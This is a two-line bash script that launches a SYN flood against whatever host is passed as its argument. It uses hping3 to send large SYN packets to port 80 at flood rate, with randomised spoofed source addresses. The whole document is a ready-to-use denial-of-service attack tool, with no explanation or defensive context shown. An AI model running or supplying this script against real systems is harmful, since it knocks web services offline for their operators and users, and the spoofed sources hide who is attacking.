#!/bin/bash
hping3 -S --flood -d 1460 --rand-source -p 80 $1
